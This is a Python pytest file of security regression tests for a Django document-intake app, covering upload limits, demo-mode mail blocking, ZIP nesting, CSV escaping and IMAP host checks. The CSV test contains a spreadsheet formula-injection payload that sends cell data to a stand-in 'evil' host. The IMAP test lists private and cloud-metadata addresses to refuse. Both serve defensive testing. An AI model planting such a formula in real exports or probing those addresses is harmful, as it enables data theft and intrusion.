"""Regression tests for the security review of the wave 1 features."""
import io
import socket
import zipfile

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import Client
from django.urls import reverse
from PIL import Image
from pypdf import PdfWriter

from apps.core import csvsafe
from apps.demo import mail as demo_mail
from apps.demo.services import tryit
from apps.documents.services.ingest import RejectedFile
from apps.intake.services import archives, images
from apps.mailboxes.models import MailboxMessage
from apps.mailboxes.services import imap, inbound
from apps.notifications.delivery import attempt
from apps.notifications.models import Channel, Delivery

from .test_email_inbound import DOMAIN, KEY, mailgun_fields

# ------------------------------------------------------------------ try page


def _blank_pdf(pages: int) -> bytes:
    w = PdfWriter()
    for _ in range(pages):
        w.add_blank_page(width=200, height=200)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def test_try_page_counts_pages_without_laying_them_out():
    assert tryit._page_count(_blank_pdf(3)) == 3
    assert tryit._page_count(_blank_pdf(5000)) == 5000   # pdfplumber needed minutes for files like this


@pytest.mark.django_db
def test_try_page_refuses_a_pdf_with_too_many_pages(settings):
    settings.TRY_MAX_PAGES = 10
    with pytest.raises(tryit.TryRejected, match="5000 pages"):
        tryit.validate_upload(SimpleUploadedFile("many.pdf", _blank_pdf(5000), content_type="application/pdf"))


def test_ipv6_visitors_are_counted_per_network():
    assert tryit.ip_hash("2001:db8:1:2::1") == tryit.ip_hash("2001:db8:1:2:ffff::9")
    assert tryit.ip_hash("2001:db8:1:2::1") != tryit.ip_hash("2001:db8:1:3::1")
    assert tryit.ip_hash("203.0.113.5") != tryit.ip_hash("203.0.113.6")
    assert tryit.ip_hash("::ffff:203.0.113.5") == tryit.ip_hash("203.0.113.5")


# ------------------------------------------------------------------ demo mode sends nothing outside


def test_demo_email_backend_sends_nothing(mailoutbox):
    from django.core.mail import EmailMessage

    sent = demo_mail.DemoEmailBackend().send_messages([EmailMessage("Hi", "Body", to=["victim@example.org"])])
    assert sent == 1 and mailoutbox == []


@pytest.mark.django_db
def test_demo_mode_never_posts_alerts(org, settings, mailoutbox):
    settings.DEMO_MODE, settings.DEMO_SEND_OUTSIDE = True, False
    channel = Channel.objects.create(organization=org, kind=Channel.Kind.EMAIL, name="Team",
                                     email_recipients="victim@example.org", events=["test"])
    d = Delivery.objects.create(organization=org, channel=channel, event="test", title="t",
                                message={"event": "test", "title": "t", "text": "attacker text"}, is_test=True)
    attempt(d, allow_retry=False)
    d.refresh_from_db()
    assert d.status == Delivery.Status.FAILED and "public demo" in d.error and mailoutbox == []
    settings.DEMO_SEND_OUTSIDE = True
    assert not demo_mail.outbound_blocked()


# ------------------------------------------------------------------ images


def _tiff(frames: int, size=(1200, 1600)) -> bytes:
    pages = [Image.new("L", size, 255) for _ in range(frames)]
    buf = io.BytesIO()
    pages[0].save(buf, format="TIFF", save_all=True, append_images=pages[1:], compression="tiff_lzw")
    return buf.getvalue()


def test_multi_page_tiff_becomes_one_pdf_page_per_frame():
    pdf, info = images.image_to_pdf("scan.tiff", _tiff(3))
    assert info["pages"] == 3 and pdf.startswith(b"%PDF")


def test_tiff_total_pixels_are_capped_across_frames(settings):
    settings.INTAKE_MAX_IMAGE_TOTAL_MEGAPIXELS = 5   # each frame is ~1.9 MP: the third one goes over
    with pytest.raises(RejectedFile, match="too large"):
        images.image_to_pdf("scan.tiff", _tiff(3))


# ------------------------------------------------------------------ ZIP nesting


@pytest.mark.django_db
def test_zip_nesting_limit_holds_whatever_the_member_is_called(org, settings, monkeypatch):
    settings.INTAKE_ZIP_MAX_DEPTH = 1
    monkeypatch.setattr(archives, "archive_depth", lambda parent: 2)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("invoice.pdf", b"%PDF-1.4\n")
    with pytest.raises(RejectedFile, match="ZIP inside a ZIP"):
        archives.ingest_archive(org, "deep.zip", buf.getvalue(), "f" * 64, source="upload", process="none")


# ------------------------------------------------------------------ Mailgun with a large HTML body


@pytest.mark.django_db
def test_mailgun_accepts_large_html_bodies_within_the_email_limit(org, settings):
    settings.INBOUND_EMAIL_DOMAIN = DOMAIN
    settings.MAILGUN_SIGNING_KEY = KEY
    settings.INBOUND_EMAIL_MAX_MB = 25
    address = inbound.ensure_inbound(org).inbound_address
    fields = mailgun_fields(address)
    big = "<p>" + "x" * 1_500_000 + "</p>"          # sent twice: over Django's 2.5 MB form-field limit
    fields.update({"body-html": big, "stripped-html": big})
    r = Client().post(reverse("inbound:mailgun"), data=fields)
    assert r.status_code == 200, r.content
    assert MailboxMessage.objects.filter(organization=org).count() == 1


# ------------------------------------------------------------------ CSV exports


def test_csv_cells_that_would_run_as_formulas_are_quoted():
    assert csvsafe.cell('=HYPERLINK("https://evil/?"&B2,"x").pdf').startswith("'=")
    assert csvsafe.cell("@SUM(1)") == "'@SUM(1)"
    assert csvsafe.cell("-12.50") == "-12.50" and csvsafe.cell("+1,250.00") == "+1,250.00"
    assert csvsafe.cell("Harborlink Logistics") == "Harborlink Logistics" and csvsafe.cell(12) == 12
    assert csvsafe.unquote(csvsafe.cell("=Vendor")) == "=Vendor"


# ------------------------------------------------------------------ public ROI page


@pytest.mark.django_db
def test_roi_page_survives_extreme_numbers(client):
    r = client.get(reverse("roi:calculator"), {"hourly_cost": "1E-999990", "error_share": "0"})
    assert r.status_code == 200 and "Enter a number" in r.content.decode()


# ------------------------------------------------------------------ IMAP host check


@pytest.mark.parametrize("ip", ["100.64.1.1", "10.0.0.5", "127.0.0.1", "169.254.169.254", "::ffff:10.0.0.1", "fd00::1"])
def test_imap_refuses_non_public_addresses(ip, settings, monkeypatch):
    settings.MAILBOX_ALLOW_PRIVATE_HOSTS = False
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **k: [(family, socket.SOCK_STREAM, 6, "", (ip, 993))])
    with pytest.raises(imap.ImapError, match="private network"):
        imap.check_host("imap.example.com")


def test_imap_allows_public_addresses(settings, monkeypatch):
    settings.MAILBOX_ALLOW_PRIVATE_HOSTS = False
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("142.250.1.108", 993))])
    imap.check_host("imap.gmail.com")
